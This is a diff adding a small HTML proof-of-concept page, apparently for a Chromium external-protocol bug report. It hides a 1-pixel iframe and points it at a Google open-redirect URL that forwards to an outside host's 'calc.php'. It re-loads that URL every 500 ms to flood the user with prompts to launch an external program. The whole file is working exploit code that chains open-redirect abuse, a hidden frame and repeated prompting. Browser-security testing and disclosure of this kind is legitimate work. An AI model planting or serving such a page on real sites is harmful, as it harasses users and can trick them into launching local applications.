@@ -1,0 +1,19 @@
+<!doctype html>
+<html>
+<head>
+<style>html { font-family: sans-serif; }</style>
+</head>
+<body>
+<h1>Client-side redirect by target + Server-side redirect by attacker (calc) via iframe for repeated prompts</h1>
+<p>Repeated prompts work automatically with an extension installed. Otherwise, click anywhere in any open tab or browser UI to unblock.</p>
+<iframe id="calcFrame" style="width:1px;height:1px;"></iframe>
+<script>
+var show = () => {
+    calcFrame.src = 'https://www.google.com/url?q=https%3A%2F%2Faogarantiza.com%2Fchromium%2Fexternal-protocol%2Fcalc.php&sa=D&sntz=1&usg=AFQjCNGOqAoEa7AghaevcuD3T2XmJY62gw';
+}
+
+show()
+setInterval(show, 500); // Re-prompt every 500ms if unblocked, which will occur automatically with most extensions
+</script>
+</body>
+</html>
